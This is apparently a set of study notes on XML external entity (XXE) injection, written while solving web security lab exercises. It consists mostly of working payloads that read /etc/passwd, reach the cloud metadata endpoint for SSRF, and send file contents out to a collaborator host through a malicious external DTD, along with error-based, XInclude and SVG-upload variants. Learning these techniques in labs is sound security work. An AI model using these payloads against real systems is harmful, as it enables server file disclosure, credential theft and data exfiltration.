# XXE (XML external entity) injection 

## Description

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.

### Exploiting XXE using external entities to retrieve files

You can retrive files, if there is not any protection, changing the XML data type of a request as follow
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck> 
```
adding DOCTYPE {name} ... and value "xxe", remember to retrive it with &{}
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### Exploiting XXE to perform SSRF attacks

In other cases, sometimes you need to dive into a directory structure, as EC2 of Amazon or others, in order to retrive some sensitive information

```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
Replace the productId number with a reference to the external entity: &xxe;
```

### Blind XXE with out-of-band interaction
You can make a DNS lookup towards the Burp collaborator client, to see if the server is vulnerable
```
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
```
"Replace the productId number with a reference to the external entity:

&xxe;"


### Blind XXE with out-of-band interaction via XML parameter entities

In some cases you can't use the entity, therefore you have to use the parameter entities with the annotation % parameter and %parameter; to retrive it
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % carlo SYSTEM "https://ybdidzl9ndh2mcf3dzoeeutho8uyin.oastify.com"> %carlo; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

### Exploiting blind XXE to exfiltrate data using a malicious external DTD
With this type of vulnerabilities you can retrive file, sending them to a listening server as the burp collaborator client sample

Place the Burp Collaborator payload into a malicious DTD file, on the Exploit Server

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://jvi3xk5u7y1n6xzoxk8zyfd28tek29.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

request to hack:

Insert the following external entity definition in between the XML declaration and the stockCheck element:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % carlo SYSTEM "https://exploit-0af2003e0314120dc0088cf6010a00c0.web-security-academy.net/exploit.dtd"> %carlo;]>
<stockCheck><productId>%carlo;</productId><storeId>1</storeId></stockCheck>
```

### Exploiting blind XXE to retrieve data via error messages

In some cases you can exploit the server retriving files through error messages
in your malacious, you need to place this into your exploit server and create an endpoint

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

In the request to add this kind of payload
"Insert the following external entity definition in between the XML declaration and the stockCheck element:"

```
<!DOCTYPE foo [<!ENTITY % carlo SYSTEM "https://exploit-0a18004704c57cd0c05d0fb801140078.web-security-academy.net/malicious.dtd"> %carlo;]>
```

### Exploiting XInclude to retrieve files


In other cases you can use the Xinclude XML, because sometimes you can't modify the DOCTYPE

Use this kind of structure in case, trying to find the current point to inject the code

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
### Exploiting XXE via image file upload

Another intresting scenario, could be injecting SVG, which has the XML format and try to inject command there, in order to retrive information from it
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

Sometime you need to intercept the request and insert directly the payload, in order to let it work
